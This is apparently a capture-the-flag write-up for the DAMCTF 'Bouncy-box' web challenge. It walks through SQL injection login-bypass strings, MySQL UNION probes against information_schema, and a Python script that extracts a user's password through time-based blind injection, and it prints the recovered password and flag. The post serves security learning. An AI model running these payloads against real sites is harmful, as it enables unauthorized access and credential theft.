---
layout: post
title:  "[DAMCTF] Bouncy-box"
date:   "2021-11-07"
categories: Web
author: voidPtr
login1_img: /assets/posts_images/Bouncy box/login.PNG
scoreboard_img: /assets/posts_images/Bouncy box/scoreboard.PNG
login2_img: /assets/posts_images/Bouncy box/login2.PNG
---

The website show us a simple minigame. Whenever we lose, we can login and save our score, but there is no registration.
<figure>
<img src="{{ page.login1_img }}" alt="login1">
</figure>

In order to see the users already registered, we can access at the scoreboard. As we can see, there are two special users that have the VIP status.

<figure>
<img src="{{ page.scoreboard_img }}" alt="scoreboard">
</figure>

Personally I focused on boxy_mcbounce, but the two users should be equally good to get the flag.  
To bypass the first login, we can use a simple SQL injection, for example:
```
username: boxy_mcbounce
password: a' OR 1=1; -- 
```
An important thing to notice while attempting this login is that whenever we fail, we get an error displayed below the login. It could be an html error, or an "invalid cretential" message, or directly a 500 from the browser.  
Instead when we succesfully login, we get a "Logging you in" caption and we are redirected to a profile page. We will use this in a while.  

In this page, there is a "Free flag" button, but if we click it we are prompted with a new login. This time it is not vulnerable to SQL injection (for what I've tested)
<figure>
<img src="{{ page.login2_img }}" alt="login2">
</figure>

So my idea was to exploit the first login and attempt a blind SQL injection error-based to get the real password of the user boxy_mcbounce.  

First I tested for the environment, using some built-in functions, and discovered that they used MySQL:
```
boxy_mcbounce' AND conv('a',16,2)=conv('a',16,2);-- 
```

From now on, to retrieve the remaining needed information I used the sleep() function in my queries, in order to have an additional feedback to know if my queries returned something (if the elapsed time was above 5 seconds) or not.  

In order to get some responses, I first needed to know the exact number of columns retrieved by the original query. I used this query, incrementing the number until there was an error, and found out it was 5:
```
boxy_mcbounce' ORDER BY 2;-- 
```

Then I searched for the name of the table. My guess was obviously something like "users". Anyway I tested for it and discovered I was right. To get the exact value, we need to test for each character, so from now on I will use also the substr() function to guess one character at a time.
```
boxy_mcbounce' UNION SELECT 1,2,3,4,sleep(5) from information_schema.tables where substr(table_name, 2, 1) = 's';-- 
```

Now we need the name of the columns, but only of the ones we need, username and password. My guess was again something obvious like "username" and "password". Right again =)  
```
boxy_mcbounce' UNION SELECT 1,2,3,column_name,sleep(5) from information_schema.columns where table_name='users' and column_name LIKE 'user%' AND substr(column_name, 5, 1) = 'n'; -- 
```
This time the above query it's a bit different. There were collisions on the names of other columns and i got too much positive responses that were confusing me. So to be sure I was testing the character of the right column, I added the LIKE clause.  

Now comes the fun part. We know the table name and the name of the columns we need. Time to bruteforce.  

I wrote a python script to get the real password value of the user boxy_mcbounce. I noticed that special characters like "_" were breaking the server in most cases, and causing a delay of more than 20-30 seconds. So I decided to test only for alphanumeric characters. Here's the script.  
```python
import requests
import string

TARGET_URL = 'https://bouncy-box.chals.damctf.xyz'

possibleChars = string.ascii_letters + string.digits

result = ""

for pwLenght in range(20):
    print("ACTUAL PASSWORD: " + result)
    for c in possibleChars:
        query = "boxy_mcbounce' UNION SELECT 1,2,username,password,sleep(10) from users where username='boxy_mcbounce' and substr(password, "+str(pwLenght)+", 1) = '"+c+"'; -- "
        r = requests.post(TARGET_URL+'/login', json={
            "username" : "boxy_mcbounce",
            "password" : query,
            "score": 666
        })
        time = int(r.elapsed.total_seconds())
        if(time > 8):
            result += c
            break
        print(r.status_code)
        
print("FINAL PASSWORD: " + result)
```

The script output was "b0uncybounc3".  

We just need to put the real credentials in the second login and get the flag.
```
dam{b0uNCE_B0UNcE_b0uncE_B0uNCY_B0unce_b0Unce_b0Unc3}
```

